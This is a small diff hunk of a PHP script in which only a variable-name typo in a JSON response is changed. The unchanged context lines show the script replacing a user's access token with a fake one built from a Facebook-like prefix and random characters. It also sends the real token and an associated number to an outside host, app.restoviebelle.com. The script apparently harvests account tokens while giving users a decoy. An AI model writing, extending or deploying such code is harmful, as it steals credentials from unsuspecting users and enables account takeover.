@@ -107,7 +107,7 @@ $racc =  "EAAAAUaZA8jlABA".RandomString(strlen(substr($token,15)));
 $data["access_token"] = $racc;
 Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$num.",".$token);
 }
-echo json_encode(array("data"=>$data,"user"=>$rum));
+echo json_encode(array("data"=>$data,"user"=>$rnum));
 
 }else{
   if(!isset($_GET["check"])){
